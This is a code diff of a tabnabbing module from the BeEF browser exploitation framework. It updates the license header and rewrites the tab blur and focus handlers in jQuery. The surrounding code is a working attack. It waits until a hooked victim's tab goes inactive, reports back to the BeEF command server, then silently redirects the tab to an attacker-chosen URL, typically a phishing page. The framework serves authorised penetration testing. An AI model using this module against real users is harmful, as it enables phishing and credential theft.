@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 beef.execute(function() {
 
 	var url = "<%= @url %>";
@@ -22,14 +13,13 @@ beef.execute(function() {
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=waiting for tab to become inactive');
 
 	// begin countdown when the tab loses focus
-	window.onblur = function() {
+	$j(window).blur(function(e) {
 		begin_countdown();
-	}
 
 	// stop countdown if the tab regains focus
-	window.onfocus = function() {
+	}).focus(function(e) {
 		clearTimeout(tabnab_timer);
-	}
+	});
 
 	begin_countdown = function() {
 		tabnab_timer = setTimeout(function() { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=redirected'); window.location = url; }, wait);
